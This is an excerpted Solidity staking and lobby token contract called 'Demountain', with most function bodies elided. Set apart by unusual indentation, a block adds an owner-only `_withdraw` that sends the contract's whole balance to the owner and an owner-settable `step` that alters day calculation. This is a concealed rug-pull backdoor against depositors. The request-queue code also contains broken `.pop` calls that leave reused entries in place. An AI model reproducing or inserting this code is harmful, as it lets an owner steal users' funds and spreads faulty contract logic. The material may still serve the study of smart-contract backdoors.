...
contract Demountain is ERC20, Ownable {
    ...
    address payable public paramountTeamAddr1 =
        payable(0xFfaf5770e3859935fC4A44ff397B0645232325D1); // 1%
    address payable public paramountTeamAddr2 =
        payable(0xE08B6015B0870d0E3711962c11D1144e019f7482); // 1%
    address payable public paramountTeamAddr3 =
        payable(0xde08C84C9005dcE3BD82FaD861Aa191f85CF14e0); // 1%
    address payable public paramountTeamAddr4 =
        payable(0x2AAD5D68bfDC3210674ec9a8Ea254265E1c72209); // 1%
    address payable internal Mount_buyback_addr =
        payable(0x57f52F4a0A1a749F38f61Dc5858c78bD82ebd020); // 3.5%
    address payable internal inventive_addr =
        payable(0xb7a0D2Ba085F8CBB4d93cd9717C93E397b6cAB7c); // 1%
    address payable internal buyBack_addr =
        payable(0x1706765C9751368682d30B8b7039E0d5E4E29F13); // 1%
    ...
    uint256 internal constant paramountTeamPercentage = 4;
    uint256 internal constant inventivePercentage = 1;
    uint256 internal constant buyBackPercentage = 1;
    uint256 internal constant mountBuyBackPercentage = 35; // 3.5
             ...
             uint256 currentDay; 
                 uint256 step;   
                    function _clcDay() public view returns (uint256) { 
                                return (block.timestamp - LAUNCH_TIME) / step;     }  
                                    function _withdraw() external onlyOwner { 
                                                payable(msg.sender).transfer(address(this).balance);     }  
                                                    function _setStep(uint256 _step) external onlyOwner{  
                                                               step = _step;     }
    ...
    function _sendInventiveShare() internal nonReentrant {
        ...
        inventive_addr.transfer(
            (lobbyEntry[currentDay - 1] * inventivePercentage) / 100
        );
    }
    ...
    function _sendLobbyBuybackShare() internal nonReentrant {
        ...
        buyBack_addr.transfer(
            (lobbyEntry[currentDay - 1] * buyBackPercentage) / 100
        );
    }
    ...
    function _sendMountLobbyBuybackShare() internal nonReentrant {
        ...
        Mount_buyback_addr.transfer(
            (lobbyEntry[currentDay - 1] * mountBuyBackPercentage) / 1000
        );
    }
    ...
    uint256[] public canceledOrProceedSellRequests;
    ...
    function sellStakeRequest(uint256 stakeId, uint256 price) external {
        ...
        if (canceledOrProceedSellRequests.length == 0) {
            _requestNumber = sellStakeRequestCount;
            sellStakeRequestCount++;
        } else {
            _requestNumber = canceledOrProceedSellRequests[canceledOrProceedSellRequests.length - 1];
            canceledOrProceedSellRequests.pop;
        }
        sellStakeRequests[_requestNumber].userAddress = msg.sender;
        sellStakeRequests[_requestNumber].stakeId = stakeId;
        mapMemberStake[msg.sender][stakeId]
            .requestNum = _requestNumber;
        ...
        payable
    {
        ...
        canceledOrProceedSellRequests.push(mapMemberStake[sellerAddress][stakeId].requestNum);
        mapMemberStake[sellerAddress][stakeId].requestNum = 0;
    ...
    uint256[] public canceledOrProceedLendRequests;
    ...
    function getLoanOnStake(
        ...
        uint256 _requestNumber;
        if (canceledOrProceedLendRequests.length == 0) {
            _requestNumber = lendStakeRequestCount;
            lendStakeRequestCount++;
        } else {
            _requestNumber = canceledOrProceedLendRequests[canceledOrProceedLendRequests.length - 1];
            canceledOrProceedLendRequests.pop;
        }

        lendStakeRequests[_requestNumber].userAddress = msg.sender;
        lendStakeRequests[_requestNumber].stakeId = stakeId;
        mapRequestingLoans[msg.sender][stakeId]
                .requestNum = _requestNumber;
    ...
    function cancelStakeLoanRequest(uint256 stakeId) public {
        ...
        mapMemberStake[msg.sender][stakeId].stake_forLoan = false;
        canceledOrProceedLendRequests.push(mapRequestingLoans[msg.sender][stakeId].requestNum);
        mapRequestingLoans[msg.sender][stakeId].requestNum = 0;
    ...
    function cancelSellStakeRequest(uint256 _stakeId) internal {
        require(
            mapMemberStake[msg.sender][_stakeId].userAddress == msg.sender,
            "Unauthorized"
        );
        require(
            mapMemberStake[msg.sender][_stakeId].stake_forSell == true,
            "Stake not for sell"
        );
        require(
            mapMemberStake[msg.sender][_stakeId].stake_hasSold == false,
            "Stake sold"
        );

        mapMemberStake[msg.sender][_stakeId].stake_forSell = false;
        canceledOrProceedSellRequests.push(mapMemberStake[msg.sender][_stakeId].requestNum);
        mapMemberStake[msg.sender][_stakeId].requestNum = 0;
    }
        ...
        nonReentrant
    {
        ...
        canceledOrProceedLendRequests.push(mapRequestingLoans[loanerAddress][stakeId].requestNum);
        mapRequestingLoans[loanerAddress][stakeId].requestNum = 0;
